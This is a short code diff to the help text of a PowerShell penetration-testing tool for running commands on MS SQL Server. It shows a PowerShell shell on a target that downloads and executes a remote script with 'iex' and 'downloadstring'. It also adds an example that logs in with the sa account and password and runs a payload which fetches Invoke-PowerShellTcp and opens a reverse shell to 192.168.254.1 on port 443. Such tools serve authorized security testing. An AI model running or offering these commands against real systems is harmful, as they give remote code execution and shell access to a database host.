@@ -35,8 +35,11 @@ Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): P
 Starting PowerShell on the target..
 PS target> iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Get-Information.ps1''));Get-Information
 
-
 Use above to execute scripts on a target.
+
+.EXAMPLE
+PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234 -payload "iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Invoke-PowerShellTcp.ps1''));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443"
+Use above to execute scripts on a target non-interactively.
 
 .LINK
 http://www.labofapenetrationtester.com/2012/12/command-execution-on-ms-sql-server-using-powershell.html
